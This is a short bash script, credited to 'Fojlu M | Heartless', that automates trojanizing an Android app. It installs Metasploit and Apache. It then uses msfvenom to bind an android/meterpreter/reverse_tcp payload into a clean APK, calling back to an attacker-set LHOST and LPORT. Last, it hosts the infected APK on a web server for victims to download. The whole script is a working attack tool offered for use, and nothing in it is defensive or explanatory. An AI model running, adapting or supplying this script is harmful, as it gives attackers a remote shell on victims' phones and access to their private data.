#!/bin/bash
# Inject Payload in Android APK
# Created By Fojlu M | Heartless |
clear
cat << EOF

  _____       _           _              _____  _  __
 |_   _|     (_)         | |       /\   |  __ \| |/ /
   | |  _ __  _  ___  ___| |_     /  \  | |__) | ' / 
   | | | '_ \| |/ _ \/ __| __|   / /\ \ |  ___/|  <  
  _| |_| | | | |  __/ (__| |_   / ____ \| |    | . \ 
 |_____|_| |_| |\___|\___|\__| /_/    \_\_|    |_|\_\ 
            _/ |                                     
           |__/                 Version : 2.0
                             Created By : Fojlu M |Heartless|
                    Social Media Handle : /FojluM01                  

EOF
sleep 2


#Checking For Root Access
echo "Checking For Root User...."
sleep 2
if [[ $(id -u) -ne 0 ]] ; then 
   echo "You are Not Root! Please Run as root" ; exit 1 ; 
else echo "Checking For Requirement Packages.." ; 
fi


#Checking and Installing Required Packages
pkgs=(metasploit-framework apktool default-jdk aapt apksigner apache2)
for pkg in ${pkgs[@]}
do
 sudo apt install $pkg
done
sleep 2
clear
echo "Required Packages Has Been Installed Sucessfully"

#Setting Up Variables For Injecting
clear
read -p "Set Your LHOST: " lhost
read -p "Set Your LPORT: " lport
echo  "APK Files You Have :" *.apk
read -p "Write Clean APK Name: " capk
read -p "Write the Name For Bind APK: " bapk
clear

#Injecting Payload Into APK
echo "Injecting Payload into Your APK"
msfvenom -x $capk -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport -o $bapk

#Enabling Web Server and Add Payload
sudo service apache2 start
sudo cp $bapk /var/www/html/
echo "Visit To : http://$lhost/$bapk"
echo "Thank You!"
